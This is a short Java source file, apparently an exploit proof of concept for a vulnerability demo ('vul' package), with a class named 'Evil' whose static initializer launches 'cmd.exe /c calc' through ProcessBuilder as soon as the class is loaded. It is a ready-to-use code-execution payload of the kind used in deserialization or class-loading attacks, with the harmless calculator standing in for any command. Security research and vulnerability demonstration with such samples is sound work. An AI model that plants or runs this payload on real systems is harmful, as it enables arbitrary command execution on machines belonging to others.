package vul;

import java.io.IOException;

public class Evil {
    static {
        String[] cmd = {"cmd.exe", "/c", "calc"};
        ProcessBuilder processBuilder = new ProcessBuilder(cmd);
        try {
            processBuilder.start();
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
    }
}
